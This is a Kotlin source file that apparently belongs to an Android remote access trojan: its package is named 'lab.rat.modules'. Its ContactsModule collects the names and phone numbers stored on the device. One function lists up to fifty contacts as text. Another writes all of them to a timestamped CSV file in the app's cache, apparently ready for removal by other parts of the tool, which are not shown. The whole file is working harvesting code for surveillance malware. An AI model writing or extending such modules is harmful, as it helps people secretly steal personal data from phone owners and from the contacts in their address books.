package com.lab.rat.modules

import android.content.Context
import android.provider.ContactsContract
import java.io.File

object ContactsModule {

    private fun esc(v: String) = "\"${v.replace("\"", "\"\"")}\""

    fun list(ctx: Context): String {
        val sb = StringBuilder()
        var n = 0
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null)?.use { c ->
            while (c.moveToNext() && n < 50) {
                // nome nulo tratado (bug #10)
                val name = c.getString(0) ?: "(sem nome)"
                val num = c.getString(1) ?: "(sem número)"
                sb.append("$name - $num\n")
                n++
            }
        }
        if (n == 0) return "Nenhum contato"
        return "Contatos:\n$sb"
    }

    fun export(ctx: Context): File? {
        val rows = mutableListOf<String>()
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null)?.use { c ->
            while (c.moveToNext()) {
                rows.add(esc(c.getString(0) ?: "(sem nome)") + "," +
                        esc(c.getString(1) ?: ""))
            }
        } ?: return null
        if (rows.isEmpty()) return null
        val f = File(ctx.cacheDir, "contacts_${System.currentTimeMillis()}.csv")
        f.writeText("nome,telefone\n" + rows.joinToString("\n"))
        return f
    }
}
